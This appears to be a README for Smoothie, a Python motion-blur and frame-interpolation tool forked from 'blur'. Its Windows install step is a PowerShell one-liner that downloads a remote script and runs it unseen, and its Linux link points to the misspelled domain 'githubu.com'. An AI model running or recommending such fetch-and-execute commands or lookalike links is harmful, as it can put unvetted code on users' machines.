# Smoothie

Apply motion-blur on your gameplay content with frame interpolation, artifact masking and frame blending.
It is a cross-platform fork of [blur](https://github.com/f0e/blur) rewritten in Python with a focus on ease of use and integration in your existing routine.

## 5 ways to feed your videos to Smoothie:
* Launching Smoothie from the start menu
* Send To in the Explorer ([example](https://i.imgur.com/MnyYgfr.mp4))
* `sm` on the commandn line, see it's [wiki page](https://github.com/uyvvv/Smoothie/wiki)
* [MPV Trimmer](https://files.catbox.moe/t45q4k)
* One-button script to render and replace videos in your NLE

## Differences compared to blur:
```sh
- Preview (Set container to .MKV and play unrendered video)
+ Static YAML config
+ Unique config instead of per folder (set up like this per default, see --config in CLI)
+ Cross-platform (tested on Arch, Ubuntu & Windows)
+ Completely portable and automated installation via Scoop
+ FlowBlur (RSMB-like motion blur) with artifact masking (see /masks/)
+ MPV Trimmer ingration (great alternative to LosslessCut)
```

# Installation
To install Smoothie and its dependencies for Windows, run this install script command anywhere:
```sh
powershell -noe iex(irm tl.ctt.cx);Get Smoothie
```

See for Linux [here](https://githubu.com/uyvvv/Smoothie/wiki)

## Configuring Smoothie

The default recipe can be opened from the Run dialog (Windows+R):
![68747470733a2f2f692e696d6775722e636f6d2f503333376f6d742e706e67](https://user-images.githubusercontent.com/118849275/203483837-14db21d6-cc30-4df9-8a3e-dc1638e2d9d5.png)
